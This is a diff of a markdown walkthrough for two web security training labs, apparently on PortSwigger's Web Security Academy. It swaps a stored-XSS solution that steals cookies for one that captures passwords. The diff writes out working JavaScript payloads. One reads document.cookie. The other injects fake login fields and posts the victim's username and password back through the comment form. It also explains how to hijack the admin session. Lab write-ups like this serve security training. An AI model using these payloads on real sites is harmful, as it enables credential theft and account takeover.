@@ -1,4 +1,4 @@
-# XSS LAB 22 - Exploiting cross-site scripting to steal cookies
+# XSS LAB 23 - Exploiting cross-site scripting to capture passwords
 
 ## Manual Solution
 
@@ -36,7 +36,7 @@
 document.getElementsByName("csrf")[0].getAttribute('value');
 ```
 
-### 4. Stealing cookies
+### 4. Stealing credentials
 - We can inject and execute any JavaScript code we want.
 - Create a comment
     - Name: `Anything`
@@ -45,43 +45,44 @@ document.getElementsByName("csrf")[0].getAttribute('value');
     - Comment: 
 
     ```js
-    <script>
-        window.onload = function() {
-            let csrf_token = document.getElementsByName("csrf")[0].getAttribute('value');
-        
-            let data = new FormData();
-            data.append('postId', '1');
-            data.append('csrf', csrf_token);
-            data.append('comment', document.cookie);
-            data.append('name', 'kurabiye');
-            data.append('email', 'asd@asd.com');
-            data.append('website', 'https://www.google.com');
+        <input name="username" id="username">
+        <input type="password" name="password" onchange="credentials()">
+
+        <script>
+            function credentials() {
+                let csrf_token = document.getElementsByName("csrf")[0].value;
+                let username = document.getElementsByName("username")[0].value;
+                let password = document.getElementsByName("password")[0].value;
             
-            fetch('https://[YOUR_LAB_ID].web-security-academy.net/post/comment', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: data
-            });
-        }
-    </script>
+                let data = new FormData();
+                data.append('postId', '1');
+                data.append('csrf', csrf_token);
+                data.append('comment', username + ' ' + password);
+                data.append('name', 'kurabiye');
+                data.append('email', 'asd@asd.com');
+                data.append('website', 'https://www.google.com');
+                
+                fetch('https://0a460096043f826f80bab230004400cb.web-security-academy.net/post/comment', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: data
+                });
+            }
+        </script>
     ```
-    - When a victim visits the post page this JavaScript code automatically creates a comment containing the victim's cookies.
+    - When a victim visits the post page this JavaScript code automatically creates username and password fields.
+    - Victim enters username and password as part of the lab simulation. The username and password are then reflected on the post page.
     - The `fetch` function sends a POST request to the relevant URL. This function has a parameter called body which is used to send data to the server.
     - The data variable stores form data. We use `data.append` to add our desired data to the form data.
 
 ### 5. Logging in as Admin:
-- After submitting the injected comment you will see the session data in the comments.
-- Copy the session data.
-- Open the Inspect tool (Developer Tools).
-- Navigate to the Storage tab.
-- Go to Cookies and select the target website.
-- Paste the copied session value into the relevant cookie field.
-
+- After submitting the injected comment you will see the admin's username and password.
+- Log in as the admin and solve the lab.
 
 ## Automated Solution
 
 ### 1. Download the script
 ### 2. Run the script with the following command:
 ```sh
-python xss_lab_22.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
+python xss_lab_23.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
 ```
